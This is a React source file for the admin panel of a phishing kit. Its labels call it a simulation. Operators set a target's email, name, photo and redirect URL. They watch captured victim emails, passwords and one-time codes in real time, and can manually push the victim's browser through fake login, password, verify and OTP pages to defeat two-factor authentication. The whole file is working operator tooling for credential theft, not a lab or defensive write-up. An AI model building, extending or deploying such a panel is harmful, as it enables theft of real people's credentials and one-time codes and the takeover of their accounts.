
      
"use client";

import { useState, useEffect, useCallback, ChangeEvent } from "react";
import type { AppState } from "@/lib/state";
import { useForm, type SubmitHandler, Controller } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import Image from "next/image";
import { cn } from "@/lib/utils";

import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Separator } from "@/components/ui/separator";
import { Badge } from "@/components/ui/badge";
import { RefreshCw, Trash2, UserCircle, Moon, Sun, UserX, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye } from "lucide-react";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useTheme } from "next-themes";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";

type ConfigFormData = {
  targetEmail: string;
  targetName: string;
  targetProfilePicture: string;
  redirectUrl: string;
  attackMode: 'auto' | 'manual';
};

const configSchema = z.object({
    targetEmail: z.string().email({ message: "Invalid email address." }),
    targetName: z.string().min(1, { message: "Name is required." }),
    targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }).or(z.string().optional()).or(z.literal('')),
    redirectUrl: z.string().url({ message: "Please enter a valid URL." }),
    attackMode: z.enum(['auto', 'manual']),
});

export function AdminDashboard() {
  const [state, setState] = useState<AppState | null>(null);
  const [isUploading, setIsUploading] = useState(false);
  const [imagePreview, setImagePreview] = useState<string | null>(null);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const { toast } = useToast();
  const { setTheme } = useTheme();

  const {
    register,
    handleSubmit,
    reset,
    setValue,
    watch,
    control,
    formState: { errors },
  } = useForm<ConfigFormData>({
    resolver: zodResolver(configSchema),
  });

  const profilePictureUrl = watch("targetProfilePicture");

  const fetchState = useCallback(async () => {
    try {
      const res = await fetch("/api/state?view=admin");
      if (res.ok) {
        const data = await res.json();
        setState(data);
        if (document.activeElement?.tagName !== 'INPUT' && document.activeElement?.getAttribute('role') !== 'radio') {
          reset(data.config);
        }
      }
    } catch (error) {
      console.error("Failed to fetch state:", error);
    }
  }, [reset]);

  useEffect(() => {
    fetchState();
    const interval = setInterval(fetchState, 2000);
    return () => clearInterval(interval);
  }, [fetchState]);

  const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      const reader = new FileReader();
      reader.onloadend = () => {
        setImagePreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const uploadImage = async (file: File): Promise<string | null> => {
    setIsUploading(true);
    const formData = new FormData();
    formData.append("image", file);
    try {
        const response = await fetch('/api/upload', {
            method: 'POST',
            body: formData,
        });
        const result = await response.json();
        if (response.ok) {
            return result.url;
        } else {
            console.error("Image upload failed:", result);
            toast({ variant: 'destructive', title: 'Upload Failed', description: result.error || 'Unknown error' });
            return null;
        }
    } catch (error) {
        console.error('Image upload failed:', error);
        toast({ variant: 'destructive', title: 'Error', description: 'Could not upload image.' });
        return null;
    } finally {
        setIsUploading(false);
    }
  };

  const onConfigSubmit: SubmitHandler<ConfigFormData> = async (data) => {
    let finalData = { ...data };
    try {
      if (selectedFile) {
        const uploadedUrl = await uploadImage(selectedFile);
        if (uploadedUrl) {
          finalData.targetProfilePicture = uploadedUrl;
          setValue("targetProfilePicture", uploadedUrl);
          setSelectedFile(null);
          setImagePreview(null);
        } else {
            return; 
        }
      }

      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "setConfig", config: finalData }),
      });
      if (res.ok) {
        toast({ title: "Success", description: "Configuration saved." });
        fetchState();
      } else {
        throw new Error("Failed to save config");
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Could not save configuration.",
      });
    }
  };

  const handleResetState = async () => {
    if (window.confirm("Are you sure you want to reset the entire simulation state?")) {
      try {
        await fetch("/api/state", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "reset" }),
        });
        toast({ title: "State Reset", description: "The simulation has been reset." });
        fetchState();
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Could not reset state." });
      }
    }
  };
  
  const handleClearVictimData = async () => {
    if (window.confirm("Are you sure you want to clear all captured victim data? This cannot be undone.")) {
      try {
        await fetch("/api/state", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "clearVictimData" }),
        });
        toast({ title: "Victim Data Cleared", description: "All captured data has been removed." });
        fetchState();
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Could not clear victim data." });
      }
    }
  };

  const handleControlClick = async (page: string) => {
    try {
      await fetch('/api/state', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'setVictimPage', page }),
      });
      toast({ title: 'Command Sent', description: `Forcing victim view to "${page}" page.` });
    } catch (error) {
       toast({ variant: 'destructive', title: 'Error', description: 'Failed to send command.' });
    }
  };

  const getAttackLog = () => {
    if (!state) return [];
    
    const log = [];
    const { victim, config } = state;

    log.push({ icon: Eye, text: `Victim is viewing the phishing page.` });

    if (victim.email) {
      log.push({ icon: Mail, text: `Victim submitted email: ${victim.email}` });
    }
    
    if (victim.passwords && Object.values(victim.passwords).length > 0) {
      const passwordCount = Object.values(victim.passwords).length;
      log.push({ icon: KeyRound, text: `Captured ${passwordCount} password(s).` });
    }
    
    if (victim.currentPage === 'error') {
       log.push({ icon: AlertCircle, text: `Victim is seeing a simulated error.` });
    }

    if (victim.otp) {
       log.push({ icon: ShieldQuestion, text: `Victim submitted OTP: ${victim.otp}` });
    }
    
    if (victim.currentPage === 'redirect') {
      log.push({ icon: Forward, text: `Redirecting victim to the final URL.` });
      log.push({ icon: CheckCircle2, text: `Attack simulation completed successfully.` });
    }

    return log.reverse();
  };

  const attackLog = getAttackLog();

  return (
    <div className="w-full max-w-4xl mx-auto">
        <Tabs defaultValue="live" className="w-full">
            <TabsList className="grid w-full grid-cols-4">
                <TabsTrigger value="live">Live Dashboard</TabsTrigger>
                <TabsTrigger value="data">Captured Data</TabsTrigger>
                <TabsTrigger value="config">Target Config</TabsTrigger>
                <TabsTrigger value="attackMode">Attack Mode</TabsTrigger>
            </TabsList>
            <TabsContent value="live">
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between">
                    <div>
                      <CardTitle>Live Attack Dashboard</CardTitle>
                      <CardDescription>Real-time monitoring of the simulation.</CardDescription>
                    </div>
                    <div className="flex items-center gap-2">
                        <DropdownMenu>
                          <DropdownMenuTrigger asChild>
                            <Button variant="outline" size="icon">
                              <Sun className="h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0" />
                              <Moon className="absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100" />
                              <span className="sr-only">Toggle theme</span>
                            </Button>
                          </DropdownMenuTrigger>
                          <DropdownMenuContent align="end">
                            <DropdownMenuItem onClick={() => setTheme("light")}>
                              Light
                            </DropdownMenuItem>
                            <DropdownMenuItem onClick={() => setTheme("dark")}>
                              Dark
                            </DropdownMenuItem>
                            <DropdownMenuItem onClick={() => setTheme("system")}>
                              System
                            </DropdownMenuItem>
                          </DropdownMenuContent>
                        </DropdownMenu>
                        <Button variant="outline" size="icon" onClick={fetchState}><RefreshCw className="h-4 w-4" /></Button>
                        <Button variant="outline" size="icon" onClick={handleClearVictimData}><UserX className="h-4 w-4" /></Button>
                        <Button variant="destructive" size="icon" onClick={handleResetState}><Trash2 className="h-4 w-4" /></Button>
                    </div>
                  </CardHeader>
                  <CardContent className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-6">
                      <div>
                        <h3 className="font-semibold mb-2">Victim Status</h3>
                        <div className="flex items-center gap-4 p-4 bg-muted rounded-lg">
                          <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
                          <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
                           <div className="flex items-center gap-2">Attack Mode: <Badge variant="outline">{state?.config.attackMode || 'N/A'}</Badge></div>
                        </div>
                      </div>
                      <Separator />
                      <div>
                          <h3 className="font-semibold mb-2">Live Controls</h3>
                          <CardDescription className="mb-4">Force the victim's browser to a specific page. (Manual Mode Only)</CardDescription>
                          <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                              <Button 
                                variant={state?.victim.currentPage === 'login' ? "default" : "outline"}
                                onClick={() => handleControlClick('login')}
                                className={cn(state?.victim.currentPage === 'login' && "animate-shine")}
                                disabled={state?.config.attackMode === 'auto'}
                              >
                                Login
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
                                onClick={() => handleControlClick('password')}
                                className={cn(state?.victim.currentPage === 'password' && "animate-shine")}
                                 disabled={state?.config.attackMode === 'auto'}
                              >
                                Password
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
                                onClick={() => handleControlClick('pwCatch')}
                                className={cn(state?.victim.currentPage === 'pwCatch' && "animate-shine")}
                                 disabled={state?.config.attackMode === 'auto'}
                              >
                                Pw-Catch
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
                                onClick={() => handleControlClick('verify')}
                                className={cn(state?.victim.currentPage === 'verify' && "animate-shine")}
                                 disabled={state?.config.attackMode === 'auto'}
                              >
                                Verify
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'otp' ? "default" : "outline"}
                                onClick={() => handleControlClick('otp')}
                                className={cn(state?.victim.currentPage === 'otp' && "animate-shine")}
                                 disabled={state?.config.attackMode === 'auto'}
                              >
                                OTP
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'redirect' ? "default" : "outline"}
                                onClick={() => handleControlClick('redirect')}
                                className={cn(state?.victim.currentPage === 'redirect' && "animate-shine")}
                                 disabled={state?.config.attackMode === 'auto'}
                              >
                                Redirect
                              </Button>
                          </div>
                      </div>
                    </div>
                    <div>
                        <h3 className="font-semibold mb-2">Live Attack Log</h3>
                        <div className="p-4 bg-muted rounded-lg h-full space-y-3">
                           {attackLog.length > 0 ? (
                            attackLog.map((log, index) => (
                               <div key={index} className="flex items-center gap-2 text-sm">
                                <log.icon className="h-4 w-4 text-muted-foreground" />
                                <span>{log.text}</span>
                               </div>
                            ))
                           ) : (
                             <div className="flex items-center justify-center text-sm text-muted-foreground h-full">
                                Waiting for victim...
                             </div>
                           )}
                        </div>
                    </div>
                  </CardContent>
                </Card>
            </TabsContent>
            <TabsContent value="data">
              <Card>
                  <CardHeader>
                    <CardTitle>Captured Data</CardTitle>
                    <CardDescription>All data captured from the victim during the simulation.</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-4">
                      <div className="p-4 bg-muted rounded-lg">
                        <div className="font-mono text-sm">
                          <strong>Email:</strong> {state?.victim.email || "---"}
                        </div>
                      </div>
                      <div className="p-4 bg-muted rounded-lg space-y-2">
                        <div className="font-mono text-sm"><strong>Passwords:</strong></div>
                        {state?.victim.passwords && Object.values(state.victim.passwords).length > 0 ? (
                          <ul className="list-disc list-inside space-y-1">
                            {Object.values(state.victim.passwords).map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
                          </ul>
                        ) : <div className="font-mono text-sm">---</div>}
                      </div>
                       <div className="p-4 bg-muted rounded-lg">
                        <div className="font-mono text-sm">
                          <strong>OTP:</strong> {state?.victim.otp || "---"}
                        </div>
                      </div>
                    </div>
                  </CardContent>
              </Card>
            </TabsContent>
            <TabsContent value="config">
                <Card>
                  <CardHeader>
                    <CardTitle>Target Configuration</CardTitle>
                    <CardDescription>Set up the target and simulation parameters.</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <form onSubmit={handleSubmit(onConfigSubmit)} className="space-y-4">
                      <div>
                        <Label htmlFor="targetEmail">Target Email</Label>
                        <Input id="targetEmail" {...register("targetEmail")} />
                        {errors.targetEmail && <p className="text-sm text-destructive mt-1">{errors.targetEmail.message}</p>}
                      </div>
                      <div>
                        <Label htmlFor="targetName">Target Name</Label>
                        <Input id="targetName" {...register("targetName")} />
                        {errors.targetName && <p className="text-sm text-destructive mt-1">{errors.targetName.message}</p>}
                      </div>
                      <div>
                        <Label>Target Profile Picture</Label>
                        <div className="flex items-center gap-4 mt-2">
                          {imagePreview || (profilePictureUrl && profilePictureUrl.startsWith('http')) ? (
                            <Image 
                              src={imagePreview || profilePictureUrl!}
                              alt="Profile Preview"
                              width={64}
                              height={64}
                              className="rounded-full object-cover w-16 h-16"
                              data-ai-hint="person avatar" 
                            />
                          ) : (
                            <div className="w-16 h-16 rounded-full bg-muted flex items-center justify-center">
                                <UserCircle className="w-10 h-10 text-muted-foreground" />
                            </div>
                          )}
                           <div className="flex-grow">
                             <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} />
                           </div>
                        </div>
                        {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
                      </div>
                      <div>
                        <Label htmlFor="redirectUrl">Final Redirect URL</Label>
                        <Input id="redirectUrl" {...register("redirectUrl")} />
                        {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
                      </div>
                       <Controller
                          name="attackMode"
                          control={control}
                          render={({ field }) => (
                           <input type="hidden" {...field} />
                          )}
                        />
                      <Button type="submit" className="w-full" disabled={isUploading}>
                        {isUploading ? "Uploading..." : "Save Configuration"}
                      </Button>
                    </form>
                  </CardContent>
                </Card>
            </TabsContent>
            <TabsContent value="attackMode">
                 <Card>
                    <CardHeader>
                        <CardTitle>Attack Mode</CardTitle>
                        <CardDescription>Select the simulation mode.</CardDescription>
                    </CardHeader>
                    <CardContent>
                       <form onSubmit={handleSubmit(onConfigSubmit)} className="space-y-6">
                         <Controller
                            name="attackMode"
                            control={control}
                            render={({ field }) => (
                                <RadioGroup
                                    onValueChange={field.onChange}
                                    value={field.value}
                                    className="grid grid-cols-1 md:grid-cols-2 gap-4"
                                >
                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent">
                                        <div className="flex items-center justify-between w-full">
                                           <div className="font-semibold">Auto Mode</div>
                                           <RadioGroupItem value="auto" id="auto" />
                                        </div>
                                        <p className="text-sm text-muted-foreground">
                                            A streamlined flow: Email &rarr; Password &rarr; Redirect. Captures initial credentials then redirects.
                                        </p>
                                    </Label>
                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent">
                                         <div className="flex items-center justify-between w-full">
                                            <div className="font-semibold">Manual Mode</div>
                                            <RadioGroupItem value="manual" id="manual" />
                                         </div>
                                        <p className="text-sm text-muted-foreground">
                                           A multi-step, interactive flow that you control from the dashboard. Good for complex scenarios.
                                        </p>
                                    </Label>
                                </RadioGroup>
                            )}
                         />
                          <Controller
                            name="targetEmail"
                            control={control}
                            render={({ field }) => (
                            <input type="hidden" {...field} />
                            )}
                          />
                          <Controller
                            name="targetName"
                            control={control}
                            render={({ field }) => (
                            <input type="hidden" {...field} />
                            )}
                          />
                          <Controller
                            name="targetProfilePicture"
                            control={control}
                            render={({ field }) => (
                            <input type="hidden" {...field} />
                            )}
                          />
                          <Controller
                            name="redirectUrl"
                            control={control}
                            render={({ field }) => (
                            <input type="hidden" {...field} />
                            )}
                          />
                         <Button type="submit" className="w-full">Save Attack Mode</Button>
                       </form>
                    </CardContent>
                 </Card>
            </TabsContent>
        </Tabs>
    </div>
  );
}

    